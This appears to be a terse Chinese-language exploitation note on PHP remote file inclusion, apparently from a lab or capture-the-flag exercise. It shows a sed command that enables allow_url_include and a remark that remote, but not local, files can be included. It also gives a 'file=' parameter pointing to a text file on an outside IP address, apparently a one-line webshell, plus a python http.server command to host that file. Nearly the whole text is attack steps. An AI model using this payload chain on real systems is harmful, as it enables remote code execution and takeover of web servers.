`s/allow_url_include = Off/allow_url_include = On/g`
可以包含远程文件，本地不行

``` www
file=http://8.140.204.97:8000/yjh.txt
```

python3 -m http.server 8000